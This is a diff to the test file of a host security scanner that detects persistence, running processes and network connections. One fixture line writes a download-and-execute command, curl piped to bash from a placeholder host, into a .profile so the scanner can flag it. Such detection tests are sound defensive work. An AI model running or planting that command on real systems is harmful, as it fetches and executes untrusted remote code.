@@ -111,10 +111,7 @@ def test_persistence_scanner_detects_fixture(tmp_path, monkeypatch):
 
     profile = tmp_path / ".profile"
     profile.write_text("curl https://example.invalid/a | bash\n", encoding="utf-8")
-    monkeypatch.setattr(
-        "bioaegis.persistence_scanner.PERSISTENCE_FILES",
-        (profile,),
-    )
+    monkeypatch.setattr("bioaegis.persistence_scanner.PERSISTENCE_FILES", (profile,))
     findings = PersistenceScanner().scan()
     assert len(findings) == 1
     assert "download-execute" in findings[0].signals
@@ -134,3 +131,17 @@ def test_runtime_scanner_parses_fixture_proc(tmp_path):
     assert len(findings) == 1
     assert findings[0].pid == 123
     assert "download-execute" in findings[0].signals
+
+
+def test_network_scanner_decodes_fixture(tmp_path):
+    from bioaegis.network_scanner import NetworkScanner
+
+    table = tmp_path / "tcp"
+    table.write_text(
+        "sl local_address rem_address st\n"
+        "0: 0100007F:1F90 00000000:0000 0A 00000000:0000 00:00000000 00000000 0 0 0\n",
+        encoding="utf-8",
+    )
+    scanner = NetworkScanner()
+    assert scanner._read_table("tcp", table)[0].address == "127.0.0.1"
+    assert scanner._read_table("tcp", table)[0].port == 8080
